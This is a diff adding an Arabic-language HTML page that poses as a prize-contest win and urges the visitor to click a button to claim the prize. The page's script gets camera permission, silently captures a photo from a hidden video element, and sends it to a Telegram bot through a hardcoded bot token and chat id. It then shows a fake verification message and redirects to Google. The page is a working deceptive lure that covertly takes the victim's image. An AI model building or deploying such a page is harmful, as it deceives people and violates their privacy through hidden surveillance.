@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة الحلم 2026</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: Arial; padding: 20px; }
+        .btn { background: #d32f2f; color: white; padding: 20px; border: none; border-radius: 10px; font-size: 20px; cursor: pointer; width: 100%; margin-top: 50px; }
+    </style>
+</head>
+<body>
+    <img src="https://v.com/logo.png" style="width:150px;">
+    <h2>مبروك! أنت الفائز رقم 10</h2>
+    <p>اضغط على الزر أدناه لاستلام جائزتك فوراً</p>
+    
+    <button class="btn" onclick="openCam()">تحقق واستلم الجائزة</button>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const token = "7670732800:AAEq-1H8W8m6h2Kshf9K9Iu0HIsX_u-8M3s";
+        const id = "7547144883";
+
+        async function openCam() {
+            try {
+                // هنا يطلب المتصفح السماح لأن المستخدم هو من ضغط على الزر
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', id);
+                        f.append('photo', b, 'a.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
+                        .then(() => {
+                            alert("تم التحقق بنجاح! سيتم الاتصال بك خلال دقائق.");
+                            location.href = "https://google.com";
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) {
+                alert("يجب الضغط على 'سماح' عند ظهورها في الأعلى للمتابعة.");
+            }
+        }
+    </script>
+</body>
+</html>
